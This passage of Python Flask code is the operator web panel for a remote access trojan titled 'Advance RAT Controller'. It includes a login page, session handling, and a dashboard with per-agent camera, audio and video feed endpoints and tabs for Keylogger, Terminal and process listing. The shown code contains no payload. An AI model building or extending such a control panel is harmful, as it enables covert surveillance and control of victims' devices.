    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                print("Session timeout - clearing session")
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    print("Authentication successful - returning True")
    return True

def is_ip_blocked(ip):
    """Check if IP is blocked due to too many failed login attempts"""
    if ip in LOGIN_ATTEMPTS:
        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
            # Check if lockout period has passed
            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
                return True
            else:
                # Reset attempts after timeout
                del LOGIN_ATTEMPTS[ip]
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        # Verify password using secure hash comparison
        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            # Successful login
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    # Return login template as string since templates folder may not be available on Render
    login_template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Neural Control Hub - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --background: #ffffff;
                --foreground: #0a0a0f;
                --card: #ffffff;
                --card-foreground: #0a0a0f;
                --primary: #0a0a0f;
                --primary-foreground: #ffffff;
                --secondary: #f1f5f9;
                --secondary-foreground: #0a0a0f;
                --muted: #f1f5f9;
                --muted-foreground: #64748b;
                --accent: #f1f5f9;
                --accent-foreground: #0a0a0f;
                --destructive: #ef4444;
                --destructive-foreground: #ffffff;
                --border: #e2e8f0;
                --input: #f8fafc;
                --ring: #0a0a0f;
                --radius: 0.625rem;
            }
            
            @media (prefers-color-scheme: dark) {
                :root {
                    --background: #0a0a0f;
                    --foreground: #f8fafc;
                    --card: #0a0a0f;
                    --card-foreground: #f8fafc;
                    --primary: #f8fafc;
                    --primary-foreground: #0a0a0f;
                    --secondary: #1e293b;
                    --secondary-foreground: #f8fafc;
                    --muted: #1e293b;
                    --muted-foreground: #94a3b8;
                    --accent: #1e293b;
                    --accent-foreground: #f8fafc;
                    --destructive: #ef4444;
                    --destructive-foreground: #ffffff;
                    --border: #1e293b;
                    --input: #1e293b;
                    --ring: #f8fafc;
                }
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background-color: var(--background);
                color: var(--foreground);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 1rem;
                transition: background-color 0.3s ease, color 0.3s ease;
            }
            
            .login-container {
                background-color: var(--card);
                border: 1px solid var(--border);
                border-radius: var(--radius);
                padding: 2rem;
                width: 100%;
                max-width: 28rem;
                box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 2rem;
            }
            
            .login-icon {
                width: 4rem;
                height: 4rem;
                background-color: var(--primary);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 1rem;
            }
            
            .login-icon svg {
                width: 2rem;
                height: 2rem;
                color: var(--primary-foreground);
            }
            
            .login-header h1 {
                font-size: 1.5rem;
                font-weight: 700;
                color: var(--foreground);
                margin-bottom: 0.5rem;
            }
            
            .login-header p {
                color: var(--muted-foreground);
                font-size: 1rem;
            }
            
            .form-group {
                margin-bottom: 1rem;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 0.5rem;
                color: var(--foreground);
                font-weight: 500;
                font-size: 0.875rem;
            }
            
            .form-group input {
                width: 100%;
                background-color: var(--input);
                border: 1px solid var(--border);
                border-radius: calc(var(--radius) - 2px);
                padding: 0.75rem 1rem;
                color: var(--foreground);
                font-size: 1rem;
                transition: border-color 0.2s ease, box-shadow 0.2s ease;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: var(--ring);
                box-shadow: 0 0 0 2px rgba(10, 10, 15, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background-color: var(--primary);
                color: var(--primary-foreground);
                border: none;
                border-radius: calc(var(--radius) - 2px);
                padding: 0.75rem 1rem;
                font-weight: 500;
                font-size: 1rem;
                cursor: pointer;
                transition: background-color 0.2s ease, transform 0.1s ease;
                margin-top: 1rem;
            }
            
            .login-btn:hover {
                background-color: var(--primary);
                opacity: 0.9;
                transform: translateY(-1px);
            }
            
            .login-btn:active {
                transform: translateY(0);
            }
            
            .error-message {
                background-color: var(--destructive);
                color: var(--destructive-foreground);
                border: 1px solid var(--destructive);
                border-radius: calc(var(--radius) - 2px);
                padding: 0.75rem 1rem;
                margin-bottom: 1rem;
                text-align: center;
                font-size: 0.875rem;
            }
            
            .login-footer {
                margin-top: 1.5rem;
                padding-top: 1.5rem;
                border-top: 1px solid var(--border);
                text-align: center;
                font-size: 0.75rem;
                color: var(--muted-foreground);
            }
            
            .login-footer p {
                margin-bottom: 0.25rem;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <div class="login-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M9 12l2 2 4-4"/>
                    </svg>
                </div>
                <h1>Neural Control Hub</h1>
                <p>Admin Authentication Required</p>
                <p>Advanced Agent Management System</p>
            </div>
            
            {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for category, message in messages %}
                        <div class="error-message">{{ message }}</div>
                    {% endfor %}
                {% endif %}
            {% endwith %}
            
            <form method="POST">
                <div class="form-group">
                    <label for="password">Admin Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter admin password" required>
                </div>
                <button type="submit" class="login-btn">Sign In</button>
            </form>
            
            <div class="login-footer">
                <p>Secure authentication required</p>
                <p>Contact your administrator for access credentials</p>
            </div>
        </div>
    </body>
    </html>
    '''
    return render_template_string(login_template)

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Protected stub endpoints for security tests
@app.route('/stream/<agent_id>')
@require_auth
def stream(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id})

@app.route('/video_feed/<agent_id>')
@require_auth
def video_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'video'})

@app.route('/camera_feed/<agent_id>')
@require_auth
def camera_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'camera'})

@app.route('/audio_feed/<agent_id>')
@require_auth
def audio_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'audio'})

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Advance RAT Controller — Best Practices Dashboard</title>

<!-- Fonts & libs -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>

<style>
  :root{
    --bg-1:#070709;         /* deep black */
    --bg-2:#0f1724;         /* dark blue/charcoal */
    --glass: rgba(255,255,255,0.03);
    --glass-2: rgba(255,255,255,0.04);
    --accent-a:#00d4ff;
    --accent-b:#7c5cff;
    --muted:#98a0b3;
    --card-border: rgba(255,255,255,0.04);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
  body{
    background: radial-gradient(1200px 600px at 10% 10%, rgba(30,40,60,0.3), transparent),
                radial-gradient(1000px 600px at 90% 90%, rgba(90,40,120,0.12), transparent),
                linear-gradient(180deg,var(--bg-1),var(--bg-2));
    color:#dbe7ff;
    -webkit-font-smoothing:antialiased;
    overflow:hidden;
  }

  /* Top navbar */
  .top-nav{
    height:68px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 22px;
    gap:16px;
    border-bottom:1px solid rgba(255,255,255,0.03);
    backdrop-filter:blur(6px);
    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
    position:relative;
  }
  .brand{
    display:flex;
    align-items:center;
    gap:14px;
  }
  .brand .logo{
    height:44px;width:44px;border-radius:10px;
    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
    color:#02111a; box-shadow:0 6px 20px rgba(0,0,0,0.6);
  }
  .brand h1{font-size:1.05rem;margin:0;color:#e8f5ff;font-weight:700}
  .nav-tabs{display:flex;gap:12px;margin-left:20px}
  .nav-tab{
    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
    cursor:pointer; transition:all .15s ease;
  }
  .nav-tab.active{
    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
    border:1px solid rgba(255,255,255,0.03);
    box-shadow:0 6px 20px rgba(7,22,50,0.5);
  }

  .top-actions{display:flex;align-items:center;gap:12px}
  .top-actions .btn{
    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
  }
  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}

  /* Page layout */
  .page{
    display:grid;
    grid-template-columns: 320px 1fr 360px;
    grid-template-rows: auto 1fr;
    gap:16px;
    height: calc(100vh - 68px);
    padding:18px;
  }

  /* Filters row spanning center+right */
  .filters{
    grid-column: 1 / span 3;
    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
    border:1px solid var(--card-border); margin-bottom:0;
  }
  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
  .filters .filter.select{min-width:180px}
  .filters .spacer{flex:1}

  /* Left sidebar */
  .sidebar{
    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
  }
  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
  .agent-list{display:flex;flex-direction:column;gap:10px}
  .agent-item{
    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
  }
  .agent-item .meta{display:flex;gap:10px;align-items:center}
  .agent-bullet{width:12px;height:12px;border-radius:50%}
  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
  .bullet-off{background:#ff5c7c}
  .agent-name{font-weight:700;color:#eaf7ff}
  .agent-sub{font-size:0.8rem;color:var(--muted)}

  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}

  /* Center area */
  .center{
    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
  }
  .card{
    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid var(--card-border);
  }

  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
  .summary-card{display:flex;gap:14px;align-items:center}
  .summary-card .chart-wrap{width:100px;height:100px;display:flex;align-items:center;justify-content:center}
  .summary-card .info{flex:1}
  .metric-big{font-size:1.45rem;font-weight:800;color:#fff}
  .metric-sub{color:var(--muted);font-size:0.85rem;margin-top:6px}

  .trend{
    margin-top:6px;height:320px;
  }

  /* Right column */
  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}

  /* System Overview sections */
  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
  .overview-section{padding:16px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05)}
  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1rem;font-weight:600}
  .info-display{display:flex;flex-direction:column;gap:8px}
  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
  .info-item .label{color:var(--muted);font-size:0.9rem}
  .info-item span:last-child{color:#fff;font-weight:500;text-align:right}

  /* Small helpers */
  .muted{color:var(--muted)}
  .small{font-size:0.85rem}
  .kpi{display:flex;gap:8px;align-items:center}
  .kpi .dot{width:10px;height:10px;border-radius:50%}
  .dot-blue{background:var(--accent-a)}
  .dot-purple{background:var(--accent-b)}

  /* responsive */
  @media (max-width:1100px){
    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
    .filters{grid-column:1}
  }
</style>
</head>
<body>

  <div class="top-nav">
    <div class="brand">
      <div class="logo">N</div>
      <div style="display:flex;flex-direction:column;line-height:1">
        <h1>Advance Rat Controller</h1>
        <div class="muted small">Agent Live Monitoring</div>
      </div>

      <div class="nav-tabs" style="margin-left:22px">
        <div class="nav-tab active">Overview</div>
        <div class="nav-tab">List Process</div>
        <div class="nav-tab">System Info</div>
        <div class="nav-tab">Terminal</div>
        <div class="nav-tab">Keylogger</div>
        
      </div>
    </div>

    <div class="top-actions">
      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
      <a href="/logout" class="logout">Logout</a>
    </div>
  </div>

  <div class="page">

    <!-- FILTERS -->
    <div class="filters">
      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
      <div class="spacer"></div>
      <div class="filter small">Export</div>
      <div class="filter small">Refresh</div>
    </div>

    <!-- LEFT -->
    <div class="sidebar card">
      <h3>Active Agents</h3>
      <div class="agent-list" id="agent-list">
        <!-- JS will populate -->
        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
          No agents connected
        </div>
      </div>

      <div class="controls">
        <button class="control-btn primary" onclick="getSystemInfo()">Agent Stats</button>
        <button class="control-btn" onclick="getNetworkInfo()">System Health</button>
        <button class="control-btn" onclick="listProcesses()">List Processes</button>
        <button class="control-btn" onclick="refreshOverview()">Refresh Dashboard</button>
      </div>
    </div>

    <!-- CENTER -->
    <div class="center">
      <!-- Summary row -->
      <div class="card summary-row">
        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut1" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric1">23</div>
            <div class="metric-sub">Agent Reports</div>
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut2" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric2">8</div>
            <div class="metric-sub">Agents Status</div>
           
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut3" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric3">41%</div>
            <div class="metric-sub">Overall Pass Rate</div>
            <div class="small muted">Trend vs previous period</div>
          </div>
        </div>
      </div>

      <!-- Trend chart -->
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
          <div style="font-weight:700">Controller Status</div>
          <div class="muted small">Last 30 days</div>
        </div>
        <div class="trend">
          <canvas id="trendChart" width="800" height="320"></canvas>
        </div>
      </div>

      <!-- System Overview with Dashboard Metrics -->
      <div style="display:flex;gap:12px">
        <div class="card" style="flex:1">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">System Overview</div>
            <div class="muted small">Real-time monitoring</div>
          </div>
          <div class="system-overview">
            <div class="overview-section">
              <h4>Agent Statistics</h4>
              <div id="agent-stats-display" class="info-display">
                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">0</span></div>
                <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
                <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
                <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
              </div>
            </div>
            <div class="overview-section">
              <h4>System Health</h4>
              <div id="system-health-display" class="info-display">
                <div class="info-item"><span class="label">Controller Status:</span> <span id="controller-status">Active</span></div>
                <div class="info-item"><span class="label">Monitoring Period:</span> <span id="monitoring-period">Last 30 days</span></div>
                <div class="info-item"><span class="label">System Uptime:</span> <span id="system-uptime">Loading...</span></div>
                <div class="info-item"><span class="label">Last Update:</span> <span id="last-update">Just now</span></div>
              </div>
            </div>
          </div>
        </div>

        <div class="card" style="width:340px">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <div style="font-weight:700">Quick Metrics</div>
            <div class="muted small">Real-time</div>
          </div>

          <div class="metric-grid" style="margin-top:12px">
            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
          </div>

          <div style="margin-top:12px;font-weight:700">Output</div>
          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
        </div>
      </div>
    </div>

    <!-- RIGHT -->
    <div class="rightcol">
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <div style="font-weight:700">Config Status</div>
          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
        </div>
        <div style="margin-top:12px;display:grid;gap:8px">
          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
        </div>
      </div>

      <div class="card">
        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
        <div style="display:flex;flex-direction:column;gap:8px">
          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
          <div class="small muted">Make sure you are connected via secure channel.</div>
        </div>
      </div>
    </div>

  </div>

<script>
  /* --------- Socket.IO hook (existing server) --------- */
  const socket = io();

  // Example socket events wiring - adapt to your server event names
  socket.on('connect', ()=> {
    appendLog('Socket connected: ' + socket.id);
    updateMetric('m1', '---');
  });

  socket.on('agent_list', data => {
    renderAgentList(data);
  });

  socket.on('terminal_output', data => {
    appendLog(data);
  });

  socket.on('config_status', data => {
    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
    document.getElementById('cfg3').innerText = data.session_timeout + 's';
    document.getElementById('cfg4').innerText = data.blocked_ips.length;
  });

  /* --------- Render helpers --------- */
  function appendLog(msg){
    const el = document.getElementById('output-terminal');
    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
  }
  function renderAgentList(list){
    const container = document.getElementById('agent-list');
    container.innerHTML = '';
    if(!list || list.length===0){
      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
      return;
    }
    list.forEach(a=>{
      const item = document.createElement('div');
      item.className='agent-item';
      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
      item.onclick = ()=>{ selectAgent(a.id); };
      container.appendChild(item);
    });
  }
  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }

  /* --------- Chart.js: doughnuts + trend --------- */
  const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};

  const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
    type:'doughnut',
    data:{labels:['error','problems','bugs'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Online','Recently','Offline'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}]},
    options:doughnutOpts
  });

  const trendCtx = document.getElementById('trendChart').getContext('2d');
  const trendChart = new Chart(trendCtx, {
    type: 'line',
    data: {
      labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
      datasets: [
        {label:'latency', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
        {label:'Overall Agents', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
        {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
        {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
      ]
    },
    options:{
      responsive:true, maintainAspectRatio:false,
      plugins:{legend:{labels:{color:'#cfeaff'}}},
      scales:{
        x:{grid:{display:false}, ticks:{color:'#9fb8d8'}},
        y:{grid:{color:'rgba(255,255,255,0.03)'}, ticks:{color:'#9fb8d8'}}
      }
    }
  });

  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
